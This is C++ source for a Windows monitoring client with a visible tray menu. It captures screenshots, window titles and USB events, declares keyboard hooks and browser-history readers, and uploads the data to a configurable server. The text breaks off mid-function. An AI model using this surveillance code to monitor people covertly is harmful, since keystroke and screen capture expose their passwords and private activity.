#include <windows.h>
#include <wininet.h>
#include <wincred.h>
#include <cstring>
#include <string>
#include <atomic>
// MinGW compatibility patch
#ifndef _OBJIDL_H_
#include <objidl.h>
#endif
#ifndef _PROPID_DEFINED
#define _PROPID_DEFINED
typedef ULONG PROPID;
#endif
#include <gdiplus.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <setupapi.h>
#include <devguid.h>
#include <regstr.h>
#include <shlobj.h>
#include <sqlite3.h>
#include <json/json.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <map>
#include <mutex>
#include <set>
#include <algorithm> // for std::replace
#include <iomanip>   // for std::put_time
#include <iphlpapi.h> // for GetAdaptersInfo
#include <ShellScalingApi.h>
#include <winsock2.h>
#include <ws2tcpip.h>

// Windows notification headers
#include <shellapi.h>
#include <commctrl.h>

// USB device notification constants (if not defined in MinGW)
#ifndef DBT_DEVICEARRIVAL
#define DBT_DEVICEARRIVAL 0x8000
#endif
#ifndef DBT_DEVICEREMOVECOMPLETE
#define DBT_DEVICEREMOVECOMPLETE 0x8004
#endif
#ifndef DBT_DEVTYP_DEVICEINTERFACE
#define DBT_DEVTYP_DEVICEINTERFACE 0x00000005
#endif
#ifndef GUID_DEVINTERFACE_USB_DEVICE
DEFINE_GUID(GUID_DEVINTERFACE_USB_DEVICE, 0xA5DCBF10L, 0x6530, 0x11D2, 0x90, 0x1F, 0x00, 0xC0, 0x4F, 0xB9, 0x51, 0xED);
#endif

// Additional USB device GUIDs for better monitoring
#ifndef GUID_DEVINTERFACE_USB_HUB
DEFINE_GUID(GUID_DEVINTERFACE_USB_HUB, 0xF359721BL, 0xA47B, 0x11D5, 0x9C, 0xE8, 0x00, 0x50, 0x56, 0xB8, 0x7F, 0x00);
#endif

#ifndef GUID_DEVINTERFACE_DISK
DEFINE_GUID(GUID_DEVINTERFACE_DISK, 0x53F56307L, 0xB6BF, 0x11D0, 0x94, 0xF2, 0x00, 0xA0, 0xC9, 0x1E, 0xFB, 0x8B);
#endif

#ifndef GUID_DEVINTERFACE_CDROM
DEFINE_GUID(GUID_DEVINTERFACE_CDROM, 0x53F56308L, 0xB6BF, 0x11D0, 0x94, 0xF2, 0x00, 0xA0, 0xC9, 0x1E, 0xFB, 0x8B);
#endif

#ifndef GUID_DEVINTERFACE_KEYBOARD
DEFINE_GUID(GUID_DEVINTERFACE_KEYBOARD, 0x884b96c3L, 0x56ef, 0x11d1, 0xbc, 0x8c, 0x00, 0xa0, 0xc9, 0x14, 0x05, 0xdd);
#endif

#ifndef GUID_DEVINTERFACE_MOUSE
DEFINE_GUID(GUID_DEVINTERFACE_MOUSE, 0x378de44cL, 0x56ef, 0x11d1, 0xbc, 0x8c, 0x00, 0xa0, 0xc9, 0x14, 0x05, 0xdd);
#endif

// Device broadcast structures (if not defined in MinGW)
#ifndef DEV_BROADCAST_HDR
typedef struct _DEV_BROADCAST_HDR {
    DWORD dbch_size;
    DWORD dbch_devicetype;
    DWORD dbch_reserved;
} DEV_BROADCAST_HDR, *PDEV_BROADCAST_HDR;
#endif

#ifndef DEV_BROADCAST_DEVICEINTERFACE
typedef struct _DEV_BROADCAST_DEVICEINTERFACE {
    DWORD dbcc_size;
    DWORD dbcc_devicetype;
    DWORD dbcc_reserved;
    GUID dbcc_classguid;
    char dbcc_name[1];
} DEV_BROADCAST_DEVICEINTERFACE, *PDEV_BROADCAST_DEVICEINTERFACE;
#endif

// Library linking is handled by CMakeLists.txt
// #pragma comment directives are MSVC-specific and not needed with MinGW
// #pragma comment(lib, "wininet.lib")
// #pragma comment(lib, "gdiplus.lib")
// #pragma comment(lib, "psapi.lib")
// #pragma comment(lib, "setupapi.lib")
// #pragma comment(lib, "sqlite3.lib")
// #pragma comment(lib, "Shcore.lib")
// #pragma comment(lib, "ole32.lib")
// #pragma comment(lib, "oleaut32.lib")
// #pragma comment(lib, "ws2_32.lib")

// Configuration constants (will be updated from API)
#define SCREEN_INTERVAL_DEFAULT 5
#define TIC_INTERVAL_DEFAULT 30
#define HISTORY_INTERVAL_DEFAULT 120
#define KEY_INTERVAL_DEFAULT 60
#define USB_INTERVAL_DEFAULT 30
#define CONFIG_REFRESH_INTERVAL_DEFAULT 300
#define STORAGE_CHECK_INTERVAL 5

// Current configuration values (updated from API)
int screenInterval = SCREEN_INTERVAL_DEFAULT;
int ticInterval = TIC_INTERVAL_DEFAULT;
int historyInterval = HISTORY_INTERVAL_DEFAULT;
int keyInterval = KEY_INTERVAL_DEFAULT;
int usbInterval = USB_INTERVAL_DEFAULT;
int configRefreshInterval = CONFIG_REFRESH_INTERVAL_DEFAULT;
#define WM_TRAYICON (WM_USER + 1)
#define ID_TRAY_EXIT 1001
#define ID_TRAY_STATUS 1002
#define ID_TRAY_SEND_ALL 1003
#define ID_TRAY_CLIENT_INFO 1004
#define ID_TRAY_SERVER_INFO 1005
#define ID_TRAY_SCREENSHOT_STATUS 1006
#define ID_TRAY_TIC_STATUS 1007
#define ID_TRAY_BROWSER_STATUS 1008
#define ID_TRAY_KEYLOG_STATUS 1009
#define ID_TRAY_USB_STATUS 1010
#define ID_TRAY_CONFIG_REFRESH 1011
#define ID_TRAY_SIGN_IN 1012
#define ID_TRAY_SETTINGS 1013
#define ID_TRAY_NOTIFICATIONS 1014

// Configuration structures
struct IntervalsConfig {
    int screenshot;
    int tic;
    int history;
    int keylog;
    int usb;
    int config_refresh;
};

struct ServerConfig {
    int max_retry_attempts;
    int connection_timeout;
    int request_timeout;
    int chunk_size;
    bool compression_enabled;
};

struct FeaturesConfig {
    bool screenshot_enabled;
    bool browser_history_enabled;
    bool keylog_enabled;
    bool usb_monitoring_enabled;
    bool debug_logging_enabled;
    bool auto_update_enabled;
};

struct ClientConfig {
    IntervalsConfig intervals;
    ServerConfig server;
    FeaturesConfig features;
    std::string platform;
    std::string version;
    std::string last_updated;
};

// Global variables
std::string macAddress;
std::string serverIP;
std::string serverPort;
std::string username;
std::mutex authMutex;
std::string clientToken;
std::atomic<int> selectedMonitorId{0};
bool notificationsEnabled = true;
std::string signedInUsername;
bool showMonitorSettings();
bool restoreClientSession();
std::string getClientToken(){std::lock_guard<std::mutex> g(authMutex);return clientToken;}

// Global configuration
ClientConfig currentConfig;
bool isConfigUpdating = false;
std::chrono::system_clock::time_point lastConfigUpdate;
double lastBrowserTic = -1;
bool activeRunning = true;

// Memory management constants
const size_t MAX_KEY_LOGS = 1000;
const size_t MAX_USB_LOGS = 500;
const size_t MAX_BROWSER_HISTORIES = 2000;

std::vector<Json::Value> keyLogs;
std::vector<Json::Value> usbDeviceLogs;
std::vector<Json::Value> browserHistories;
std::mutex dataMutex;
HHOOK keyboardHook = NULL;
HHOOK mouseHook = NULL;

// System tray variables
NOTIFYICONDATAA nid;
HMENU hTrayMenu = NULL;
HWND hMainWindow = NULL;

// Connection status tracking
struct ConnectionStatus {
    bool serverConnected = false;
    bool previousServerConnected = false; // Track previous state for notifications
    std::string lastScreenshotStatus = "Never";
    std::string lastTicStatus = "Never";
    std::string lastHistoryStatus = "Never";
    std::string lastKeyLogStatus = "Never";
    std::string lastUSBLogStatus = "Never";
    std::string lastError = "";
    std::chrono::steady_clock::time_point lastSuccess = std::chrono::steady_clock::now();
};
std::mutex statusMutex;
ConnectionStatus connectionStatus;

// Browser history tracking - store last fetch times for each browser
int64_t lastChromeFetch = 0;
int64_t lastFirefoxFetch = 0;
int64_t lastEdgeFetch = 0;

// Log file for debugging
std::ofstream debugLogFile;

// Configuration
std::string API_BASE_URL;
std::string API_ROUTE = "/webapi.php";
std::string TIC_ROUTE = "/eventhandler.php";
std::string APP_VERSION = "1.4";

// USB monitoring using WMI
std::thread usbMonitoringThread;
bool usbMonitoringActive = false;

// Structure for browser history
struct BrowserHistoryEntry {
    std::string date;
    std::string url;
    std::string title;
};

// Structure for key log
struct KeyLogEntry {
    std::string date;
    std::string application;
    std::string key;
};

// Structure for USB device log
struct USBDeviceEntry {
    std::string date;
    std::string device;
    std::string action;
};

// Function declarations
std::string getMacAddress();
std::string getCurrentDateTimeString();
std::string getActiveWindowTitle();
std::string getKeyName(DWORD vkCode, DWORD scanCode, DWORD flags);
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
std::string takeScreenshot();
bool sendScreenshot(const std::string& filePath);
bool sendTicEvent();
bool sendBrowserHistories();
bool sendKeyLogs();
bool sendUSBLogs();
bool updateUsername(const std::string& newUsername);
void collectBrowserHistory();
void setupKeyboardHook();
void removeKeyboardHook();
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
std::string getLocalIPAddress();
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
void setupUSBMONITORING();
void cleanupUSBMONITORING();
std::string httpPost(const std::string& url, const std::string& data);
std::string httpPostFile(const std::string& url, const std::string& filePath);
std::string getChromeHistory(int64_t sinceTime = 0);
std::string getFirefoxHistory(int64_t sinceTime = 0);
std::string getEdgeHistory(int64_t sinceTime = 0);
void monitorTask();
void writeDebugLog(const std::string& message);
bool loadSettings();
bool fetchConfigurationFromAPI();
void updateConfiguration(const Json::Value& config);
void manualConfigRefresh();
void setupSystemTray();
void cleanupSystemTray();
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void updateTrayIcon();
void showConnectionError(const std::string& error);
bool testServerConnection();
void showToastNotification(const std::string& title, const std::string& message, const std::string& type = "info");
void checkConnectionStatusChange();
void updateTrayMenu();
void manageMemoryLimits();
void sendInitialDataRequests();
void cleanupTemporaryFiles();
bool showClientLogin();

// Show Windows notification
void showToastNotification(const std::string& title, const std::string& message, const std::string& type) {
    if (!notificationsEnabled) return;
    // Use Windows Shell notification (balloon tip)
    if (nid.hWnd != NULL) {
        nid.uFlags = NIF_INFO;
        nid.dwInfoFlags = (type == "error") ? NIIF_ERROR : NIIF_INFO;
        strcpy_s(nid.szInfo, message.c_str());
        strcpy_s(nid.szInfoTitle, title.c_str());
        
        if (Shell_NotifyIconA(NIM_MODIFY, &nid)) {
            // Notification shown successfully
        } else {
            // Failed to show notification
        }
    } else {
        // System tray not available
    }
}

// Check for connection status changes and show notifications
void checkConnectionStatusChange() {
    std::lock_guard<std::mutex> lock(statusMutex);
    
    if (connectionStatus.serverConnected != connectionStatus.previousServerConnected) {
        if (connectionStatus.serverConnected) {
            showToastNotification("Server Connected", "Successfully connected to monitoring server", "info");
        } else {
            showToastNotification("Server Disconnected", "Lost connection to monitoring server", "error");
        }
        connectionStatus.previousServerConnected = connectionStatus.serverConnected;
    }
}

// Update tray menu with current status
void updateTrayMenu() {
    std::lock_guard<std::mutex> lock(statusMutex);
    if (!hTrayMenu) return;
    
    // Clear the menu
    while (GetMenuItemCount(hTrayMenu) > 0) {
        DeleteMenu(hTrayMenu, 0, MF_BYPOSITION);
    }
    
    // Add client information section
    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_CLIENT_INFO, "=== CLIENT INFO ===");
    
    // Client IP and MAC
    std::string clientIP = getLocalIPAddress();
    std::string clientInfo = "IP: " + clientIP + " | MAC: " + macAddress;
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_CLIENT_INFO, clientInfo.c_str());
    
    // Server information section
    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_SERVER_INFO, "=== SERVER INFO ===");
    
    std::string serverInfo = "Server: " + serverIP + ":" + serverPort;
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_SERVER_INFO, serverInfo.c_str());
    
    std::string serverConnectionStatus = connectionStatus.serverConnected ? "Status: Connected" : "Status: Disconnected";
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_SERVER_INFO, serverConnectionStatus.c_str());
    
    // Request status section
    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_STATUS, "=== REQUEST STATUS ===");
    
    // Screenshot status
    std::string screenshotStatus = "Screenshots: " + connectionStatus.lastScreenshotStatus;
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_SCREENSHOT_STATUS, screenshotStatus.c_str());
    
    // Tic status
    std::string ticStatus = "Tic Events: " + connectionStatus.lastTicStatus;
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_TIC_STATUS, ticStatus.c_str());
    
    // Browser history status
    std::string browserStatus = "Browser History: " + connectionStatus.lastHistoryStatus;
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_BROWSER_STATUS, browserStatus.c_str());
    
    // Key log status
    std::string keyLogStatus = "Key Logs: " + connectionStatus.lastKeyLogStatus;
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_KEYLOG_STATUS, keyLogStatus.c_str());
    
    // USB log status
    std::string usbStatus = "USB Logs: " + connectionStatus.lastUSBLogStatus;
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_USB_STATUS, usbStatus.c_str());
    
    // Configuration section
    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_STATUS, "=== CONFIGURATION ===");
    
    // Configuration refresh button
    AppendMenuA(hTrayMenu, MF_STRING, ID_TRAY_CONFIG_REFRESH, "Refresh Configuration");
    AppendMenuA(hTrayMenu, MF_STRING, ID_TRAY_SIGN_IN, getClientToken().empty() ? "Sign in / Sign up" : "Switch account");
    AppendMenuA(hTrayMenu, MF_STRING, ID_TRAY_SETTINGS, "Monitor Settings...");
    AppendMenuA(hTrayMenu, MF_STRING | (notificationsEnabled ? MF_CHECKED : MF_UNCHECKED), ID_TRAY_NOTIFICATIONS, "Status notifications");
    
    // Actions section
    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
    AppendMenuA(hTrayMenu, MF_STRING, ID_TRAY_SEND_ALL, "Send All Requests Now");
    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
    AppendMenuA(hTrayMenu, MF_STRING, ID_TRAY_EXIT, "Quit MonitorClient");
}

// Setup USB monitoring using device notifications (more efficient)
void setupUSBMONITORING() {
    usbMonitoringActive = true;
    usbMonitoringThread = std::thread([]() {
        
        // Get initial USB devices list (one-time scan)
        std::set<std::string> knownDevices;
        HDEVINFO deviceInfoSet = SetupDiGetClassDevsA(&GUID_DEVCLASS_USB, NULL, NULL, DIGCF_PRESENT);
        if (deviceInfoSet != INVALID_HANDLE_VALUE) {
            SP_DEVINFO_DATA deviceInfoData;
            deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
            
            DWORD deviceIndex = 0;
            while (SetupDiEnumDeviceInfo(deviceInfoSet, deviceIndex, &deviceInfoData)) {
                char deviceId[256] = {0};
                if (SetupDiGetDeviceInstanceIdA(deviceInfoSet, &deviceInfoData, deviceId, sizeof(deviceId), NULL)) {
                    knownDevices.insert(deviceId);
                }
                deviceIndex++;
            }
            SetupDiDestroyDeviceInfoList(deviceInfoSet);
            // Initial USB devices scan completed
        }
        
        // Now use periodic checks but with much longer intervals (30 seconds instead of 2)
        while (usbMonitoringActive) {
            std::this_thread::sleep_for(std::chrono::seconds(30)); // Reduced from 2 seconds to 30 seconds
            
            if (!usbMonitoringActive) break;
            
            // Quick scan for changes
            std::set<std::string> currentDevices;
            HDEVINFO deviceInfoSet = SetupDiGetClassDevsA(&GUID_DEVCLASS_USB, NULL, NULL, DIGCF_PRESENT);
            if (deviceInfoSet != INVALID_HANDLE_VALUE) {
                SP_DEVINFO_DATA deviceInfoData;
                deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
                
                DWORD deviceIndex = 0;
                while (SetupDiEnumDeviceInfo(deviceInfoSet, deviceIndex, &deviceInfoData)) {
                    char deviceId[256] = {0};
                    if (SetupDiGetDeviceInstanceIdA(deviceInfoSet, &deviceInfoData, deviceId, sizeof(deviceId), NULL)) {
                        std::string deviceIdStr = deviceId;
                        currentDevices.insert(deviceIdStr);
                        
                        // Check if this is a new device
                        if (knownDevices.find(deviceIdStr) == knownDevices.end()) {
                            // New device connected
                            std::string deviceName = "USB Device";
                            
                            // Try to get friendly name
                            char friendlyName[256] = {0};
                            if (SetupDiGetDeviceRegistryPropertyA(deviceInfoSet, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)friendlyName, sizeof(friendlyName), NULL)) {
                                deviceName = friendlyName;
                            } else {
                                char deviceDesc[256] = {0};
                                if (SetupDiGetDeviceRegistryPropertyA(deviceInfoSet, &deviceInfoData, SPDRP_DEVICEDESC, NULL, (PBYTE)deviceDesc, sizeof(deviceDesc), NULL)) {
                                    deviceName = deviceDesc;
                                }
                            }
                            
                            Json::Value usbLog;
                            usbLog["date"] = getCurrentDateTimeString();
                            usbLog["device_name"] = deviceName;
                            usbLog["device_path"] = deviceIdStr;
                            usbLog["device_type"] = "USB Device";
                            usbLog["action"] = "Connected";
                            
                            // USB Device Connected
                            
                            // Show toast notification for USB device connected
                            showToastNotification("USB Device Connected", deviceName, "info");
                            
                            std::lock_guard<std::mutex> lock(dataMutex);
                            usbDeviceLogs.push_back(usbLog);
                        }
                    }
                    deviceIndex++;
                }
                
                SetupDiDestroyDeviceInfoList(deviceInfoSet);
            }
            
            // Check for disconnected devices
            for (const auto& device : knownDevices) {
                if (currentDevices.find(device) == currentDevices.end()) {
                    // Device disconnected
                    Json::Value usbLog;
                    usbLog["date"] = getCurrentDateTimeString();
                    usbLog["device_name"] = "USB Device";
                    usbLog["device_path"] = device;
                    usbLog["device_type"] = "USB Device";
                    usbLog["action"] = "Disconnected";
                    
                    // USB Device Disconnected
                    
                    // Show toast notification for USB device disconnected
                    showToastNotification("USB Device Disconnected", "USB device was removed", "warning");
                    
                    std::lock_guard<std::mutex> lock(dataMutex);
                    usbDeviceLogs.push_back(usbLog);
                }
            }
            
            knownDevices = currentDevices;
        }
        
        // USB monitoring thread stopped
    });
}

// Cleanup USB monitoring
void cleanupUSBMONITORING() {
    usbMonitoringActive = false;
    
    if (usbMonitoringThread.joinable()) {
        usbMonitoringThread.join();
    }
}

// Get MAC address - improved version to get primary active adapter
std::string getMacAddress() {
    std::string macAddress;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    
    if (pAdapterInfo == NULL) {
        return "";
    }
    
    // First call to get required buffer size
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
        if (pAdapterInfo == NULL) {
            return "";
        }
    }
    
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        std::string bestMac = "";
        int bestPriority = -1;
        
        while (pAdapter) {
            // Only process adapters with valid MAC addresses
            if (pAdapter->AddressLength == 6) {
                // Check if adapter has a valid IP address
                bool hasValidIP = false;
                PIP_ADDR_STRING pIPAddr = &pAdapter->IpAddressList;
                while (pIPAddr) {
                    std::string ip = pIPAddr->IpAddress.String;
                    if (!ip.empty() && ip != "0.0.0.0" && 
                        ip.substr(0, 4) != "127." && 
                        ip.substr(0, 8) != "169.254." &&
                        ip.find(':') == std::string::npos) {
                        hasValidIP = true;
                        break;
                    }
                    pIPAddr = pIPAddr->Next;
                }
                
                if (hasValidIP) {
                    char mac[18];
                    sprintf_s(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
                        pAdapter->Address[0], pAdapter->Address[1],
                        pAdapter->Address[2], pAdapter->Address[3],
                        pAdapter->Address[4], pAdapter->Address[5]);
                    
                    // Priority system: Ethernet > Wi-Fi > Others
                    int priority = 0;
                    if (pAdapter->Type == MIB_IF_TYPE_ETHERNET) {
                        priority = 3; // Highest priority for Ethernet
                    } else if (pAdapter->Type == IF_TYPE_IEEE80211) {
                        priority = 2; // Second priority for Wi-Fi
                    } else if (pAdapter->Type == IF_TYPE_PPP) {
                        priority = 1; // Low priority for PPP (dial-up, VPN)
                    } else {
                        priority = 0; // Lowest priority for others
                    }
                    
                    // Also check adapter name for additional hints
                    std::string adapterName = pAdapter->AdapterName;
                    std::string description = pAdapter->Description;
                    
                    // Boost priority for adapters that are likely primary
                    if (description.find("Ethernet") != std::string::npos || 
                        description.find("Gigabit") != std::string::npos ||
                        description.find("Realtek") != std::string::npos ||
                        description.find("Intel") != std::string::npos) {
                        priority += 1;
                    }
                    
                    // Skip virtual adapters and tunnels
                    if (description.find("Virtual") == std::string::npos &&
                        description.find("Tunnel") == std::string::npos &&
                        description.find("Loopback") == std::string::npos &&
                        description.find("VMware") == std::string::npos &&
                        description.find("VirtualBox") == std::string::npos) {
                        
                        if (priority > bestPriority) {
                            bestMac = std::string(mac);
                            bestPriority = priority;
                            // Found candidate MAC
                        }
                    }
                }
            }
            pAdapter = pAdapter->Next;
        }
        
        if (!bestMac.empty()) {
            macAddress = bestMac;
        }
    } else {
        // GetAdaptersInfo failed
    }
    
    free(pAdapterInfo);
    
    // Final validation
    if (macAddress.empty()) {
        // Could not determine MAC address
    } else {
        // MAC address determined
    }
    
    return macAddress;
}

// Get current date time string
std::string getCurrentDateTimeString() {
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

// Get active window title
std::string getActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (hwnd == NULL) return "Unknown";
    
    char windowTitle[256];
    GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
    
    DWORD processId;
    GetWindowThreadProcessId(hwnd, &processId);
    
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess != NULL) {
        char processName[MAX_PATH];
        if (GetModuleBaseNameA(hProcess, NULL, processName, sizeof(processName)) > 0) {
            CloseHandle(hProcess);
            return std::string(processName) + " (" + std::string(windowTitle) + ")";
        }
        CloseHandle(hProcess);
    }
    
    return std::string(windowTitle);
}

// Get key name from virtual key code
std::string getKeyName(DWORD vkCode, DWORD scanCode, DWORD flags) {
    char keyName[256];
    UINT scanCodeMap = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    
    if (GetKeyNameTextA(scanCodeMap << 16, keyName, sizeof(keyName)) > 0) {
        return std::string(keyName);
    }
    
    // Fallback for common keys
    switch (vkCode) {
        case VK_RETURN: return "Enter";
        case VK_ESCAPE: return "Escape";
        case VK_TAB: return "Tab";
        case VK_SPACE: return "Space";
        case VK_BACK: return "Backspace";
        case VK_DELETE: return "Delete";
        case VK_INSERT: return "Insert";
        case VK_HOME: return "Home";
        case VK_END: return "End";
        case VK_PRIOR: return "Page Up";
        case VK_NEXT: return "Page Down";
        case VK_LEFT: return "Left";
        case VK_RIGHT: return "Right";
        case VK_UP: return "Up";
        case VK_DOWN: return "Down";
        case VK_F1: return "F1";
        case VK_F2: return "F2";
        case VK_F3: return "F3";
        case VK_F4: return "F4";
        case VK_F5: return "F5";
        case VK_F6: return "F6";
        case VK_F7: return "F7";
        case VK_F8: return "F8";
        case VK_F9: return "F9";
        case VK_F10: return "F10";
        case VK_F11: return "F11";
        case VK_F12: return "F12";
        default: return "Key" + std::to_string(vkCode);
    }
}

// Move GetEncoderClsid declaration up
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);

// Take screenshot to temporary file
std::string takeScreenshot() {
    // Get the desktop window handle
    HWND hDesktop = GetDesktopWindow();
    
    // Get the desktop DC
    HDC hdcScreen = GetDC(hDesktop);
    HDC hdcMemory = CreateCompatibleDC(hdcScreen);
    
    // Get the desktop dimensions (now DPI-aware)
    RECT desktopRect;
    GetWindowRect(hDesktop, &desktopRect);
    
    int captureWidth = desktopRect.right - desktopRect.left;
    int captureHeight = desktopRect.bottom - desktopRect.top;
    
    // Desktop dimensions captured
    
    // Create a bitmap at the correct resolution
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, captureWidth, captureHeight);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMemory, hbmScreen);
    
    // Capture the entire desktop
    BitBlt(hdcMemory, 0, 0, captureWidth, captureHeight, hdcScreen, 0, 0, SRCCOPY);
    
    // Save to temporary file using GDI+ with optimized compression
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromHBITMAP(hbmScreen, NULL);
    
    // Use JPEG encoder for better compression instead of PNG
    CLSID jpegClsid;
    GetEncoderClsid(L"image/jpeg", &jpegClsid);
    
    // Set JPEG quality parameters for smaller file size
    Gdiplus::EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    
    // Set quality to 70% (good balance between quality and size)
    ULONG quality = 70;
    encoderParams.Parameter[0].Value = &quality;
    
    // Create temporary file path
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string tempFileName = std::string(tempPath) + "screenshot_" + std::to_string(GetTickCount()) + ".jpg";
    
    std::wstring wTempFileName(tempFileName.begin(), tempFileName.end());
    
    bmp->Save(wTempFileName.c_str(), &jpegClsid, &encoderParams);
    
    delete bmp;
    Gdiplus::GdiplusShutdown(gdiplusToken);
    
    SelectObject(hdcMemory, hbmOld);
    DeleteObject(hbmScreen);
    DeleteDC(hdcMemory);
    ReleaseDC(NULL, hdcScreen);
    
    return tempFileName;
}

// Move GetEncoderClsid definition above takeScreenshot
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

// Send screenshot to server
bool sendScreenshot(const std::string& filePath) {
    std::string url = API_BASE_URL + API_ROUTE + "?type=upload";
    if(selectedMonitorId.load()<1)return false;
    std::string response = httpPostFile(url, filePath);
    
    // Delete the temporary file after sending
    DeleteFileA(filePath.c_str());
    
    // Parse response
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("status") && root["status"].asString() == "success") {
            // Update connection status
            {
                std::lock_guard<std::mutex> lock(statusMutex);
                connectionStatus.lastScreenshotStatus = getCurrentDateTimeString();
                connectionStatus.serverConnected = true;
                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            }
            writeDebugLog("Screenshot uploaded successfully");
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        } else if (root.isMember("error")) {
            std::string errorMsg = root["error"].asString();
            writeDebugLog("Screenshot upload error: " + errorMsg);
        }
    }
    else {
        std::lock_guard<std::mutex> lock(statusMutex);
        connectionStatus.lastScreenshotStatus = "Failed: " + getCurrentDateTimeString();
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "Screenshot upload failed";
    }
    updateTrayIcon();
    checkConnectionStatusChange();
    
    return false;
}

// Send tic event
bool sendTicEvent() {
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "Tic";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    data["MonitorId"] = selectedMonitorId.load();
    data["Username"] = username;
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("status") && root["status"].asString() == "success") {
            // Update connection status
            {
                std::lock_guard<std::mutex> lock(statusMutex);
                connectionStatus.lastTicStatus = getCurrentDateTimeString();
                connectionStatus.serverConnected = true;
                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            }
            writeDebugLog("Tic event sent successfully");
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        } else if (root.isMember("error")) {
            std::string errorMsg = root["error"].asString();
            writeDebugLog("Tic event error: " + errorMsg);
        }
    }
    else {
        std::lock_guard<std::mutex> lock(statusMutex);
        connectionStatus.lastTicStatus = "Failed: " + getCurrentDateTimeString();
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "Tic event failed";
    }
    updateTrayIcon();
    checkConnectionStatusChange();
    
    return false;
}

// Send browser histories
bool sendBrowserHistories() {
    if (browserHistories.empty()) return true;
    
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "BrowserHistory";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    data["MonitorId"] = selectedMonitorId.load();
    data["Username"] = username;
